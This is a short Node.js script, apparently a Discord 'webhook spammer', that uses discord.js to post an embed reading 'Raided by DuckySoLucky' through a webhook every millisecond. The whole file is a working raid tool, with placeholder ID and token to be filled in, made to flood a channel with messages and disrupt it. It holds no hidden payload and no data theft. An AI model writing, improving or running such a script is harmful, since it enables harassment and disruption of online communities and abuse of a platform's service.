const { MessageEmbed, WebhookClient } = require('discord.js');

const embed = new MessageEmbed()
    .setColor('#00FF00')
    .setAuthor({ name: 'Webhook Spammer!'})
    .setDescription(`Raided by DuckySoLucky\n**#Qwack**`)
    .setFooter({ text: '© Made by DuckySoLucky', iconURL: 'https://cdn.discordapp.com/avatars/486155512568741900/31cabcf3c42823f8d8266fd22babb862.png?size=4096' });

// https://discord.com/api/webhooks/ID/TOKEN
const webhookurl = new WebhookClient({ id: 'ID', token: 'TOKEN' });

setInterval(() => {
    webhookurl.send({embeds: [ embed ]});
  }, 1);